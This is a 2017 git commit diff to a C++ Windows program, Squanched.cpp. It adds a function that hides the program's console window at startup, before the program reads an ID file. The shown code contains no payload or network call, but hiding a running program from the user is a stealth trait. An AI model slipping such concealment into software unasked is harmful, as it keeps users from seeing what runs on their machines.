1ebf4ecc4c93856c66463de1fba03e92ca783c51
orargaman <orargaman@gmail.com>
2017-06-02 15:37:00 +0300

    Squanched is ran in Hidden state
    Signed-off-by: orargaman <orargaman@gmail.com>

--- Squanched/Squanched.cpp
+++ Squanched/Squanched.cpp
@@ -7,13 +7,23 @@ bool FileExist(const std::string& Name)
 	return boost::filesystem::exists(Name);
 }
 
-
+void hideWindow()
+{
+	HWND window;
+	AllocConsole();
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 0);
+}
 
 int main()
 {
+	hideWindow();
 	std::ifstream idFile;
 	char c;
 	string pathToID = get_path_to_id();
+
+	
+
 	if(FileExist(pathToID))
 	{
 		idFile.open(pathToID, std::ios::binary);
